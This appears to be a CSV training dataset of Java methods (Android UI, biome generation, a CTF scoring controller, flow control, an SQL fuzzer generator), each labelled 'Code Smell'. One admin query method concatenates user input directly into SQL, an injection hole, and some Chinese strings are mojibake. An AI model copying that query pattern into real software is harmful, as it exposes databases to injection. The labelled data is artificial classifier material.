text,label,text_label
"@Override public int eval0(int x,int z,int center,@NonNull int[] v){
  if (center == ID_MUSHROOM_ISLAND) {
    return v[0] != ID_OCEAN && v[1] != ID_OCEAN && v[2] != ID_OCEAN && v[3] != ID_OCEAN ? center : ID_MUSHROOM_ISLAND_SHORE;
  }
  if (isJungle(center)) {
    if (isJungleCompatible(v[0]) && isJungleCompatible(v[1]) && isJungleCompatible(v[2])&& isJungleCompatible(v[3])) {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
    }
 else {
      return ID_JUNGLE_EDGE;
    }
  }
 else   if (center == ID_EXTREME_HILLS || center == ID_EXTREME_HILLS_WITH_TREES || center == ID_EXTREME_HILLS_EDGE) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_STONE_BEACH;
    }
  }
 else   if (isSnowyBiome(center)) {
    if (isBiomeOceanic(center)) {
      return center;
    }
 else {
      return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_COLD_BEACH;
    }
  }
 else   if (center == ID_MESA || center == ID_MESA_ROCK) {
    if (!isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3])) {
      return isMesa(v[0]) && isMesa(v[1]) && isMesa(v[2])&& isMesa(v[3]) ? center : ID_DESERT;
    }
 else {
      return center;
    }
  }
 else   if (center == ID_OCEAN || center == ID_DEEP_OCEAN || center == ID_RIVER || center == ID_SWAMPLAND) {
    return center;
  }
 else {
    return !isBiomeOceanic(v[0]) && !isBiomeOceanic(v[1]) && !isBiomeOceanic(v[2])&& !isBiomeOceanic(v[3]) ? center : ID_BEACH;
  }
}",1,Code Smell
"@PostMapping(value=""/challenge/{name}"",params=""action=submit"") @Operation(description=""Post your answer to the challenge for a given challenge"") public String postController(@ModelAttribute ChallengeForm challengeForm,Model model,@PathVariable String name){
  var challengeDefinition=findByShortName(name);
  if (!isChallengeEnabled(challengeDefinition)) {
    model.addAttribute(""answerIncorrect"",""This challenge has been disabled."");
  }
 else {
    var challenge=challenges.findChallenge(name,runtimeEnvironment).orElseThrow(() -> new ChallengeConfigurationException(configError(""Challenge '%s' not found for environment: '%s'"",name,runtimeEnvironment.getRuntimeEnvironment().name())));
    if (challenge.answerCorrect(challengeForm.solution())) {
      scoreCard.completeChallenge(challengeDefinition);
      if (ctfModeEnabled) {
        if (!Strings.isNullOrEmpty(ctfServerAddress) && !ctfServerAddress.equals(""not_set"")) {
          if (challenge instanceof Challenge8) {
            if (!Strings.isNullOrEmpty(keyToProvideToHost) && !keyToProvideToHost.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ keyToProvideToHost);
            }
          }
 else           if (challenge instanceof Challenge30) {
            if (!Strings.isNullOrEmpty(keyToProvideToHostForChallenge30) && !keyToProvideToHostForChallenge30.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ keyToProvideToHostForChallenge30);
            }
          }
 else           if (challenge instanceof Challenge37) {
            if (!Strings.isNullOrEmpty(getKeyToProvideToHostChallenge37) && !keyToProvideToHostForChallenge30.equals(""not_set"")) {
              model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following answer in the CTF instance at "" + ctfServerAddress + ""for which you get your code: ""+ getKeyToProvideToHostChallenge37);
            }
          }
 else {
            model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the same answer in the ctf-instance of the app: "" + ctfServerAddress);
          }
        }
 else {
          String code=generateCode(challengeDefinition);
          model.addAttribute(""answerCorrect"",""Your answer is correct! "" + ""fill in the following code in CTF scoring: "" + code);
        }
      }
 else {
        model.addAttribute(""answerCorrect"",""Your answer is correct!"");
      }
    }
 else {
      model.addAttribute(""answerIncorrect"",""Your answer is incorrect, try harder ;-)"");
    }
  }
  addChallengeUI(model,challengeDefinition);
  includeScoringStatus(model,challengeDefinition);
  enrichWithHintsAndReasons(model);
  fireEnding(model);
  return ""challenge"";
}",1,Code Smell
"@Override public void onSizeChanged(int height,boolean isWidthGreater){
  if (!isPremium) {
    return;
  }
  if (height > dp(50) && keyboardVisible && !AndroidUtilities.isInMultiwindow && !AndroidUtilities.isTablet()) {
    if (isWidthGreater) {
      keyboardHeightLand=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height_land3"",keyboardHeightLand).commit();
    }
 else {
      keyboardHeight=height;
      MessagesController.getGlobalEmojiSettings().edit().putInt(""kbd_height"",keyboardHeight).commit();
    }
  }
  if (emojiViewVisible) {
    int newHeight=(isWidthGreater ? keyboardHeightLand : keyboardHeight);
    FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)emojiView.getLayoutParams();
    if (layoutParams.width != AndroidUtilities.displaySize.x || layoutParams.height != newHeight) {
      layoutParams.width=AndroidUtilities.displaySize.x;
      layoutParams.height=newHeight;
      emojiView.setLayoutParams(layoutParams);
      emojiPadding=layoutParams.height;
      keyboardNotifier.fire();
      sizeNotifierFrameLayout.requestLayout();
    }
  }
  if (lastSizeChangeValue1 == height && lastSizeChangeValue2 == isWidthGreater) {
    return;
  }
  lastSizeChangeValue1=height;
  lastSizeChangeValue2=isWidthGreater;
  boolean oldValue=keyboardVisible;
  if (currentCell != null) {
    final EditTextBoldCursor editText=currentCell.getEditField();
    keyboardVisible=editText.isFocused() && keyboardNotifier.keyboardVisible() && height > 0;
  }
 else {
    keyboardVisible=false;
  }
  if (keyboardVisible && emojiViewVisible) {
    showEmojiPopup(0);
  }
  if (emojiPadding != 0 && !keyboardVisible && keyboardVisible != oldValue && !emojiViewVisible) {
    emojiPadding=0;
    keyboardNotifier.fire();
    sizeNotifierFrameLayout.requestLayout();
  }
  if (keyboardVisible && waitingForKeyboardOpen) {
    waitingForKeyboardOpen=false;
    AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.diceStickersDidLoad) {
    String name=(String)args[0];
    if (INTERACTIONS_STICKER_PACK.equals(name)) {
      checkStickerPack();
    }
  }
 else   if (id == NotificationCenter.onEmojiInteractionsReceived) {
    if (NekoConfig.disableRemoteEmojiInteractions.Bool())     return;
    long dialogId=(long)args[0];
    TLRPC.TL_sendMessageEmojiInteraction action=(TLRPC.TL_sendMessageEmojiInteraction)args[1];
    if (dialogId == this.dialogId && supportedEmoji.contains(action.emoticon)) {
      int messageId=action.msg_id;
      if (action.interaction.data != null) {
        try {
          JSONObject jsonObject=new JSONObject(action.interaction.data);
          JSONArray array=jsonObject.getJSONArray(""a"");
          for (int i=0; i < array.length(); i++) {
            JSONObject actionObject=array.getJSONObject(i);
            int animation=actionObject.optInt(""i"",1) - 1;
            double time=actionObject.optDouble(""t"",0.0);
            AndroidUtilities.runOnUIThread(new Runnable(){
              @Override public void run(){
                findViewAndShowAnimation(messageId,animation);
              }
            }
,(long)(time * 1000));
          }
        }
 catch (        JSONException e) {
          e.printStackTrace();
        }
      }
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    Integer printingType=MessagesController.getInstance(currentAccount).getPrintingStringType(dialogId,threadMsgId);
    if (printingType != null && printingType == 5) {
      cancelHintRunnable();
    }
  }
}",1,Code Smell
"public long procConsumeResult(boolean isFilterConsume){
  long dltTime=System.currentTimeMillis() - this.lastRptTIme;
  return procConsumeResult(isFilterConsume,this.reqProcType,this.errCode,this.msgSize,this.isEscLimit,this.limitDlt,this.curDataDlt,this.isRequireSlow) - dltTime;
}
/** 
 * Process the consume result.
 * @param isFilterConsume if current consume should be filtered
 * @param reqProcType     type information
 * @param errCode         error code
 * @param msgSize         message size
 * @param isReqEscLimit   if the rsplimitDlt is ignored in current consume
 * @param rsplimitDlt     max offset of the current consume
 * @param lastDataDlt     offset of the last data fetch
 * @param isRequireSlow  if the server requires slow down
 * @return message size per minute
 */
public long procConsumeResult(boolean isFilterConsume,int reqProcType,int errCode,int msgSize,boolean isReqEscLimit,long rsplimitDlt,long lastDataDlt,boolean isRequireSlow){
  if (lastDataDlt >= 0) {
    this.lastDataRdDlt=lastDataDlt;
  }
  this.recvMsgSize+=msgSize;
  this.recvMsgInMin+=msgSize;
  long currTime=System.currentTimeMillis();
  checkAndCalcDataLimit(currTime);
  if (errCode != TErrCodeConstants.NOT_FOUND && errCode != TErrCodeConstants.SUCCESS) {
    return rsplimitDlt;
  }
  if (msgSize == 0 && errCode != TErrCodeConstants.SUCCESS) {
    this.totalRcvZeroCount+=1;
  }
 else {
    this.totalRcvZeroCount=0;
  }
  if (this.totalRcvZeroCount > 0) {
    if (this.groupFlowCtrlRuleHandler.getMinZeroCnt() != Integer.MAX_VALUE) {
      return groupFlowCtrlRuleHandler.getCurFreqLimitTime(this.totalRcvZeroCount,(int)rsplimitDlt);
    }
 else {
      return defFlowCtrlRuleHandler.getCurFreqLimitTime(this.totalRcvZeroCount,(int)rsplimitDlt);
    }
  }
  if (isReqEscLimit) {
    return 0;
  }
 else {
    if (this.recvMsgInMin >= this.curFlowCtrlVal.dataLtInSize || this.recvMsgSize >= this.limitMsgInSec) {
      return this.curFlowCtrlVal.freqLtInMs > rsplimitDlt ? this.curFlowCtrlVal.freqLtInMs : rsplimitDlt;
    }
    if (errCode == TErrCodeConstants.SUCCESS) {
      if (isFilterConsume && filterCtrlItem.getFreqLtInMs() >= 0) {
        if (isRequireSlow) {
          return this.filterCtrlItem.getZeroCnt();
        }
 else {
          return this.filterCtrlItem.getFreqLtInMs();
        }
      }
 else       if (!isFilterConsume && filterCtrlItem.getDataLtInSZ() >= 0) {
        return this.filterCtrlItem.getDataLtInSZ();
      }
    }
    return rsplimitDlt;
  }
}",1,Code Smell
"@Override public void render(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException {
  if (outputStreamEnded) {
    try {
      audioSink.playToEndOfStream();
    }
 catch (    AudioSink.WriteException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
    return;
  }
  if (inputFormat == null) {
    flagsOnlyBuffer.clear();
    int result=readSource(formatHolder,flagsOnlyBuffer,true);
    if (result == C.RESULT_FORMAT_READ) {
      onInputFormatChanged(formatHolder.format);
    }
 else     if (result == C.RESULT_BUFFER_READ) {
      Assertions.checkState(flagsOnlyBuffer.isEndOfStream());
      inputStreamEnded=true;
      processEndOfStream();
      return;
    }
 else {
      return;
    }
  }
  maybeInitDecoder();
  if (decoder != null) {
    try {
      TraceUtil.beginSection(""drainAndFeed"");
      while (drainOutputBuffer()) {
      }
      while (feedInputBuffer()) {
      }
      TraceUtil.endSection();
    }
 catch (    AudioDecoderException|AudioSink.ConfigurationException|AudioSink.InitializationException|AudioSink.WriteException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
    decoderCounters.ensureUpdated();
  }
}
",1,Code Smell
"public void send(int state,boolean notify,int scheduleDate,int ttl){
  if (textureView == null) {
    return;
  }
  stopProgressTimer();
  if (videoPlayer != null) {
    videoPlayer.releasePlayer(true);
    videoPlayer=null;
  }
  if (state == 4) {
    if (videoEncoder != null && recordedTime > 800) {
      videoEncoder.stopRecording(VideoRecorder.ENCODER_SEND_SEND,ttl);
      return;
    }
    if (BuildVars.DEBUG_VERSION && !cameraFile.exists()) {
      FileLog.e(new RuntimeException(""file not found :( round video""));
    }
    if (videoEditedInfo.needConvert()) {
      file=null;
      encryptedFile=null;
      key=null;
      iv=null;
      double totalDuration=videoEditedInfo.estimatedDuration;
      long startTime=videoEditedInfo.startTime >= 0 ? videoEditedInfo.startTime : 0;
      long endTime=videoEditedInfo.endTime >= 0 ? videoEditedInfo.endTime : videoEditedInfo.estimatedDuration;
      videoEditedInfo.estimatedDuration=endTime - startTime;
      videoEditedInfo.estimatedSize=Math.max(1,(long)(size * (videoEditedInfo.estimatedDuration / totalDuration)));
      videoEditedInfo.bitrate=1000000;
      if (videoEditedInfo.startTime > 0) {
        videoEditedInfo.startTime*=1000;
      }
      if (videoEditedInfo.endTime > 0) {
        videoEditedInfo.endTime*=1000;
      }
      FileLoader.getInstance(currentAccount).cancelFileUpload(cameraFile.getAbsolutePath(),false);
    }
 else {
      videoEditedInfo.estimatedSize=Math.max(1,size);
    }
    videoEditedInfo.file=file;
    videoEditedInfo.encryptedFile=encryptedFile;
    videoEditedInfo.key=key;
    videoEditedInfo.iv=iv;
    MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,cameraFile.getAbsolutePath(),0,true,0,0,0);
    entry.ttl=ttl;
    delegate.sendMedia(entry,videoEditedInfo,notify,scheduleDate,false);
    if (scheduleDate != 0) {
      startAnimation(false,false);
    }
    MediaController.getInstance().requestAudioFocus(false);
  }
 else {
    cancelled=recordedTime < 800;
    recording=false;
    int reason;
    if (cancelled) {
      reason=4;
    }
 else {
      reason=state == 3 ? 2 : 5;
    }
    if (cameraThread != null) {
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.recordStopped,recordingGuid,reason);
      int send;
      if (cancelled) {
        send=0;
      }
 else       if (state == 3) {
        send=2;
      }
 else {
        send=1;
      }
      saveLastCameraBitmap();
      cameraThread.shutdown(send,ttl);
      cameraThread=null;
    }
    if (cancelled) {
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.audioRecordTooShort,recordingGuid,true,(int)recordedTime);
      startAnimation(false,false);
      MediaController.getInstance().requestAudioFocus(false);
    }
  }
}",1,Code Smell
"@RequiresPermissions(""otc:appeal:page-query"") @PostMapping(""page-query"") @AccessLog(module=AdminModule.OTC,operation=""鍒嗛〉鏌ユ壘鍚庡彴鐢宠瘔Appeal"") public MessageResult pageQuery(PageModel pageModel,AppealScreen screen){
  StringBuilder headSqlBuilder=new StringBuilder(""select a.id appealId,"").append(""b.member_name advertiseCreaterUserName,b.member_real_name advertiseCreaterName,"").append(""b.customer_name customerUserName,b.customer_real_name customerName,"").append(""c.username initiatorUsername,c.real_name initiatorName,"").append(""d.username associateUsername,d.real_name associateName,"").append(""b.commission fee,b.number,b.money,b.order_sn orderSn,b.create_time transactionTime,"").append(""a.create_time createTime,a.deal_with_time dealWithTime,b.pay_mode payMode, e.name coinName,"").append(""b.status orderStatus,a.is_success isSuccess,b.advertise_type advertiseType,a.status,a.remark "");
  StringBuilder countHead=new StringBuilder(""select count(*) "");
  StringBuilder endSql=new StringBuilder(""from appeal a,otc_order b,member c,member d,otc_coin e"").append("" where a.order_id = b.id and a.initiator_id = c.id and a.associate_id = d.id "").append("" and b.coin_id = e.id and b.status != 0 "");
  if (!StringUtils.isEmpty(screen.getNegotiant())) {
    endSql.append("" and (b.customer_name like '%"" + screen.getNegotiant() + ""%'"").append("" or b.customer_real_name like '%"" + screen.getNegotiant() + ""%')"");
  }
  if (!StringUtils.isEmpty(screen.getComplainant())) {
    endSql.append("" and (b.member_name like '%"" + screen.getComplainant() + ""%'"").append("" or b.member_real_name like '%"" + screen.getComplainant() + ""%')"");
  }
  if (screen.getAdvertiseType() != null) {
    endSql.append("" and b.advertise_type = "" + screen.getAdvertiseType().getOrdinal() + "" "");
  }
  if (screen.getSuccess() != null) {
    endSql.append("" and (a.is_success = "" + screen.getSuccess().getOrdinal() + "" and a.deal_with_time is not null) "");
  }
 else {
    if (screen.getAuditing()) {
      endSql.append("" and a.is_success is null "");
    }
  }
  if (!StringUtils.isEmpty(screen.getUnit())) {
    endSql.append("" and lower(e.unit) = '"" + screen.getUnit().toLowerCase() + ""'"");
  }
  if (screen.getStatus() != null && screen.getStatus().getOrdinal() != 0) {
    endSql.append("" and b.status = "" + screen.getStatus().getOrdinal());
  }
  Page page=appealService.createNativePageQuery(countHead.append(endSql),headSqlBuilder.append(endSql),pageModel,Transformers.ALIAS_TO_ENTITY_MAP);
  return success(""鑾峰彇鎴愬姛"",page);
}",1,Code Smell
"private void createNewTable(TiDBExpressionGenerator gen,StringBuilder sb){
  sb.append(""("");
  for (int i=0; i < columns.size(); i++) {
    if (i != 0) {
      sb.append("", "");
    }
    sb.append(columns.get(i).getName());
    sb.append("" "");
    TiDBCompositeDataType type;
    type=TiDBCompositeDataType.getRandom();
    appendType(sb,type);
    sb.append("" "");
    boolean isGeneratedColumn=Randomly.getBooleanWithRatherLowProbability();
    if (isGeneratedColumn) {
      sb.append("" AS ("");
      sb.append(TiDBVisitor.asString(gen.generateExpression()));
      sb.append("") "");
      sb.append(Randomly.fromOptions(""STORED"",""VIRTUAL""));
      sb.append("" "");
      errors.add(""Generated column can refer only to generated columns defined prior to it"");
      errors.add(""'Defining a virtual generated column as primary key' is not supported for generated columns."");
      errors.add(""contains a disallowed function."");
      errors.add(""cannot refer to auto-increment column"");
    }
    if (Randomly.getBooleanWithRatherLowProbability()) {
      sb.append(""CHECK ("");
      sb.append(TiDBVisitor.asString(gen.generateExpression()));
      sb.append("") "");
    }
    if (Randomly.getBooleanWithRatherLowProbability()) {
      sb.append(""NOT NULL "");
    }
    if (Randomly.getBoolean() && type.getPrimitiveDataType().canHaveDefault() && !isGeneratedColumn) {
      sb.append(""DEFAULT "");
      sb.append(TiDBVisitor.asString(gen.generateConstant(type.getPrimitiveDataType())));
      sb.append("" "");
      errors.add(""Invalid default value"");
      errors.add(""All parts of a PRIMARY KEY must be NOT NULL; if you need NULL in a key, use UNIQUE instead"");
    }
    if (type.getPrimitiveDataType() == TiDBDataType.INT && Randomly.getBooleanWithRatherLowProbability() && !isGeneratedColumn) {
      sb.append("" AUTO_INCREMENT "");
      errors.add(""there can be only one auto column and it must be defined as a key"");
    }
    if (Randomly.getBooleanWithRatherLowProbability() && canUseAsUnique(type)) {
      sb.append(""UNIQUE "");
    }
    if (Randomly.getBooleanWithRatherLowProbability() && allowPrimaryKey && !primaryKeyAsTableConstraints&& canUseAsUnique(type)&& !isGeneratedColumn) {
      sb.append(""PRIMARY KEY "");
      allowPrimaryKey=false;
    }
  }
  if (primaryKeyAsTableConstraints) {
    sb.append("", PRIMARY KEY("");
    sb.append(Randomly.nonEmptySubset(columns).stream().map(c -> c.getName()).collect(Collectors.joining("", "")));
    sb.append("")"");
    errors.add("" used in key specification without a key length"");
  }
  sb.append("")"");
  if (Randomly.getBooleanWithRatherLowProbability()) {
    sb.append(""PARTITION BY HASH("");
    sb.append(TiDBVisitor.asString(gen.generateExpression()));
    sb.append("") "");
    sb.append(""PARTITIONS "");
    sb.append(Randomly.getNotCachedInteger(1,100));
    errors.add(""Constant, random or timezone-dependent expressions in (sub)partitioning function are not allowed"");
    errors.add(""This partition function is not allowed"");
    errors.add(""A PRIMARY KEY must include all columns in the table's partitioning function"");
    errors.add(""A UNIQUE INDEX must include all columns in the table's partitioning function"");
    errors.add(""is of a not allowed type for this type of partitioning"");
    errors.add(""The PARTITION function returns the wrong type"");
  }
}",1,Code Smell
"private void processBoostDialog(Long peerId,Runnable dismissLoading,Browser.Progress progress){
  processBoostDialog(peerId,dismissLoading,progress,null);
}
private void processBoostDialog(Long peerId,Runnable dismissLoading,Browser.Progress progress,ChatMessageCell chatMessageCell){
  ChannelBoostsController boostsController=MessagesController.getInstance(currentAccount).getBoostsController();
  if (progress != null) {
    progress.init();
  }
  boostsController.getBoostsStats(peerId,boostsStatus -> {
    if (boostsStatus == null) {
      if (progress != null) {
        progress.end();
      }
      if (dismissLoading != null) {
        dismissLoading.run();
      }
      return;
    }
    boostsController.userCanBoostChannel(peerId,boostsStatus,canApplyBoost -> {
      if (progress != null) {
        progress.end();
      }
      BaseFragment lastFragment=getLastFragment();
      if (lastFragment == null) {
        return;
      }
      Theme.ResourcesProvider resourcesProvider=lastFragment.getResourceProvider();
      if (lastFragment.getLastStoryViewer() != null && lastFragment.getLastStoryViewer().isFullyVisible()) {
        resourcesProvider=lastFragment.getLastStoryViewer().getResourceProvider();
      }
      LimitReachedBottomSheet limitReachedBottomSheet=new LimitReachedBottomSheet(lastFragment,this,TYPE_BOOSTS_FOR_USERS,currentAccount,resourcesProvider);
      limitReachedBottomSheet.setCanApplyBoost(canApplyBoost);
      boolean isCurrentChat=false;
      if (lastFragment instanceof ChatActivity) {
        isCurrentChat=((ChatActivity)lastFragment).getDialogId() == peerId;
      }
 else       if (lastFragment instanceof DialogsActivity) {
        DialogsActivity dialogsActivity=((DialogsActivity)lastFragment);
        isCurrentChat=dialogsActivity.rightSlidingDialogContainer != null && dialogsActivity.rightSlidingDialogContainer.getCurrentFragmetDialogId() == peerId;
      }
      limitReachedBottomSheet.setBoostsStats(boostsStatus,isCurrentChat);
      limitReachedBottomSheet.setDialogId(peerId);
      limitReachedBottomSheet.setChatMessageCell(chatMessageCell);
      lastFragment.showDialog(limitReachedBottomSheet);
      try {
        if (dismissLoading != null) {
          dismissLoading.run();
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
);
  }
);
}
",1,Code Smell
"public void set(TL_stories.StoryItem storyItem,EmojiAnimationsOverlay animationsOverlay){
  ArrayList<TL_stories.MediaArea> mediaAreas=storyItem != null ? storyItem.media_areas : null;
  set(storyItem,mediaAreas,animationsOverlay);
}
public void set(TL_stories.StoryItem storyItem,ArrayList<TL_stories.MediaArea> mediaAreas,EmojiAnimationsOverlay animationsOverlay){
  if (mediaAreas == lastMediaAreas && (mediaAreas == null || lastMediaAreas == null || mediaAreas.size() == lastMediaAreas.size())) {
    return;
  }
  if (hintView != null) {
    hintView.hide();
    hintView=null;
  }
  for (int i=0; i < getChildCount(); ++i) {
    View child=getChildAt(i);
    if (child != hintsContainer) {
      removeView(child);
      i--;
    }
  }
  selectedArea=null;
  parentHighlightScaleAlpha.set(0,true);
  invalidate();
  onHintVisible(false);
  malicious=false;
  lastMediaAreas=mediaAreas;
  if (mediaAreas == null) {
    return;
  }
  shined=false;
  final float W=1080, H=1920;
  double totalArea=0;
  for (int i=0; i < mediaAreas.size(); ++i) {
    TL_stories.MediaArea mediaArea=mediaAreas.get(i);
    if (mediaArea != null && mediaArea.coordinates != null) {
      View areaView;
      if (mediaArea instanceof TL_stories.TL_mediaAreaSuggestedReaction) {
        StoryReactionWidgetView storyReactionWidgetView=new StoryReactionWidgetView(getContext(),this,(TL_stories.TL_mediaAreaSuggestedReaction)mediaArea,animationsOverlay);
        areaView=storyReactionWidgetView;
        if (storyItem != null) {
          storyReactionWidgetView.setViews(storyItem.views,false);
        }
        ScaleStateListAnimator.apply(areaView);
      }
 else {
        areaView=new AreaView(getContext(),parentView,mediaArea);
      }
      areaView.setOnClickListener(this);
      addView(areaView);
      totalArea+=(mediaArea.coordinates.w / 100f * W) * (mediaArea.coordinates.h / 100f * H);
    }
  }
  malicious=false;
  hintsContainer.bringToFront();
}",1,Code Smell
"/** 
 * 鑾峰彇鍏虫敞鐨勭敤鎴蜂俊鎭�
 * @param followSearchDTO
 * @param currentUser
 * @return
 */
@Override public PageInfo<FollowDTO> getFollowUsers(FollowSearchDTO followSearchDTO,UserSsoDTO currentUser){
  Long getBigCow=followSearchDTO.getGetBigCow();
  Long getFan=followSearchDTO.getGetFan();
  if (getBigCow == null && getFan == null) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  if (getBigCow != null && getFan != null) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  FollowPoExample example=new FollowPoExample();
  FollowPoExample.Criteria criteria=example.createCriteria().andStateEqualTo(true);
  if (getBigCow != null) {
    criteria.andFromUserEqualTo(getBigCow);
  }
  if (getFan != null) {
    criteria.andToUserEqualTo(getFan);
  }
  example.setOrderByClause(""`id` desc"");
  PageHelper.startPage(followSearchDTO.getCurrentPage(),followSearchDTO.getPageSize());
  List<FollowPo> followPos=followPoMapper.selectByExample(example);
  PageInfo<FollowDTO> pageInfo=FollowMS.INSTANCE.toPage(new PageInfo<>(followPos));
  pageInfo.getList().forEach(followDTO -> {
    UserDTO userDTO=new UserDTO();
    if (getBigCow != null) {
      userDTO=userService.getById(followDTO.getToUser());
    }
    if (getFan != null) {
      userDTO=userService.getById(followDTO.getFromUser());
    }
    followDTO.setName(userDTO.getName());
    followDTO.setPicture(userDTO.getPicture());
    followDTO.setIntro(userDTO.getIntro());
    followDTO.setLevel(userlevelService.getByUserId(userDTO.getId()).get(0).getLevel());
    followDTO.setLikeCount(likeService.getUserLikeCount(userDTO.getId()));
    List<ArticleReadDTO> articleReadDTOS=articleService.getUserReadCount(Collections.singletonList(userDTO.getId()));
    followDTO.setReadCount(CollectionUtils.isEmpty(articleReadDTOS) ? 0L : articleReadDTOS.get(0).getArticleReadCount());
    if (currentUser != null) {
      FollowDTO followed=getByFromToUser(currentUser.getUserId(),userDTO.getId(),false);
      if (followed != null) {
        followDTO.setIsFollow(true);
      }
    }
  }
);
  return pageInfo;
}",1,Code Smell
